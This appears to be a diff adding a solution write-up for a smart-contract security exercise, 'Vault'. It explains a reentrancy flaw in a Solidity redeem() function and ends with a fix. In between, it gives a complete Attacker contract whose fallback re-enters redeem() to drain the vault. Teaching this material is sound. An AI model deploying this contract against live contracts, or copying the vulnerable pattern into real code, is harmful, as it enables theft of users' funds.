@@ -188,4 +188,83 @@ A potential implementation could be to have both players encrypt their choice of
 
 ## 9. Vault
 
+```Solidity
+function redeem() {
+    msg.sender.call.value(balances[msg.sender])();
+    balances[msg.sender]=0;
+}
+```
+
+### Problem
+
+```Solidity
+function redeem() {
+    msg.sender.call.value(balances[msg.sender])();
+    balances[msg.sender]=0;
+}
+```
+
+The redeem function is vulnerable to reentrancy attack. This is due to the fact that `msg.sender.call.value()` sends the balance to the fallback function of `msg.sender`, along with all available gas in the transaction. 
+
+We can implement an attacker contract to store and redeem ether from. Therefore, the execution is handed to the fallback function of `Attacker` before it finishes and its balance is updated to 0.
+
+To redeem more than we own, the fallback function of the `Attacker` would call the same `redeem()` function in `Vault`, until the vault's balance or the transaction's gas depletes.
+
+```Solidity
+pragma solidity ^0.4.25;
+
+import "./9.Vault.sol";
+
+//*** Exercice 9 ***//
+//Attacker contract to reenter the Vault contract
+contract Attacker {
+
+    address private _owner;
+    Vault vault;
+    constructor (address deployed) public {
+        _owner = msg.sender;
+        vault = Vault(deployed);
+    }
+    
+    // @dev Store ETH in the contract.
+    function store() payable public {
+        vault.store.value(msg.value)();
+    }
+    
+    /// @dev Redeem your ETH.
+    function redeem() public {
+        vault.redeem();
+    }
+    
+    function() payable public {
+        vault.redeem();
+    }
+    
+    function withdraw() public {
+        _owner.transfer(address(this).balance);
+    }
+    
+    function getTotal() public view returns(uint total) {
+        return address(this).balance;
+    }
+}
+```
+
+### Fix 
+
+Use the `.transfer()` or `.send()` functions on `msg.sender`. These two functions only pass 2300 gas to the fallback function. 
+
+As stated in the solidity docs:
+
+    In the worst case, the fallback function can only rely on 2300 gas being available (for example when send or transfer is used), leaving not much room to perform other operations except basic logging. The following operations will consume more gas than the 2300 gas stipend:
+
+    - Writing to storage
+    - Creating a contract
+    - Calling an external function which consumes a large amount of gas
+    - Sending Ether
+
+Thus, `.transfer()` and `.send()` are much safer than `.call.value()`.
+
+Also, it is better practice to set `balances[msg.sender]=0` before transfering the ether. The transfer can be wrapped in a `require` statement, so that if it fails, the amount deduction is reverted.
+
 ## 10. HeadTail
